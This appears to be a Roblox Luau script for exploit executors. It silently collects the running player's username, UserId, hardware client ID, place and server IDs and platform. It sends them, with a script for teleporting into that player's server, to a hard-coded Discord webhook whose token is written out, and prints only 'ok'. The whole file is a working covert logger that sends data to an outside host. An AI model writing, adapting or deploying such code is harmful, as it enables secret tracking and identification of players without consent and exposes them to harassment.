local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

-- Replace this with your webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"

-- Function to send information to Discord and prepare teleport script
local function sendTeleportInfo()
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local playerName = localPlayer.Name
    local userId = localPlayer.UserId
    local HWID = RbxAnalyticsService:GetClientId()
    local placeId = game.PlaceId
    local jobId = game.JobId

    -- Determine the platform
    local platform
    if UserInputService.TouchEnabled then
        platform = "Mobile"
    elseif UserInputService.KeyboardEnabled then
        platform = "PC"
    elseif UserInputService.GamepadEnabled then
        platform = "Console"
    else
        platform = "Unknown"
    end

    local requestMethod = "Unknown"
    local response = nil

    -- Determine which HTTP request method is available and use it
    if syn and syn.request then
        requestMethod = "syn"
        response = syn.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({["content"] = "Executing 0"})
        })
    elseif http and http.request then
        requestMethod = "http"
        response = http.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({["content"] = "Executing 0"})
        })
    elseif request then
        requestMethod = "request"
        response = request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({["content"] = "Executing 0"})
        })
    elseif http_request then
        requestMethod = "http_request"
        response = http_request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({["content"] = "Executing 0"})
        })
    elseif solara and solara.request then
        requestMethod = "solara"
        response = solara.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({["content"] = "Executing 0"})
        })
    elseif curl then
        requestMethod = "curl"
        local jsonData = HttpService:JSONEncode({["content"] = "Executing 0"})
        local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
        local handle = io.popen(cmd)
        local result = handle:read("*a")
        handle:close()
        response = {StatusCode = 200, StatusMessage = result}
    else
        return
    end

    -- Create embed payload to send to Discord
    local embed = {
        ["title"] = "Teleport Information",
        ["type"] = "rich",
        ["color"] = tonumber(0x00FF00), -- Green color in decimal
        ["fields"] = {
            {["name"] = "Name", ["value"] = playerName, ["inline"] = true},
            {["name"] = "UserId", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "HWID", ["value"] = HWID, ["inline"] = true},
            {["name"] = "PlaceId", ["value"] = tostring(placeId), ["inline"] = true},
            {["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
            {["name"] = "Platform", ["value"] = platform, ["inline"] = true},
            {["name"] = "HTTP Request Method", ["value"] = requestMethod, ["inline"] = true},
            {["name"] = "Teleport Script", ["value"] = "```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```", ["inline"] = false},
        }
    }

    local data = {
        ["content"] = "------------",
        ["embeds"] = {embed}
    }

    -- Convert data to JSON format
    local jsonData = HttpService:JSONEncode(data)

    -- Send POST request to Discord webhook with the actual data
    if syn and syn.request then
        response = syn.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif http and http.request then
        response = http.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif request then
        response = request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif http_request then
        response = http_request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif solara and solara.request then
        response = solara.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif curl then
        local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
        local handle = io.popen(cmd)
        local result = handle:read("*a")
        handle:close()
        response = {StatusCode = 200, StatusMessage = result}
    else
        return
    end
end

-- Function to wait for LocalPlayer to be available
local function waitForLocalPlayer()
    local localPlayer = Players.LocalPlayer
    while not localPlayer do
        wait(2)  -- Wait for 1 second before checking again
        localPlayer = Players.LocalPlayer
    end
    sendTeleportInfo()
end

-- Check if LocalPlayer is already available
if Players.LocalPlayer then
    sendTeleportInfo()
else
    waitForLocalPlayer()
end

print("ok")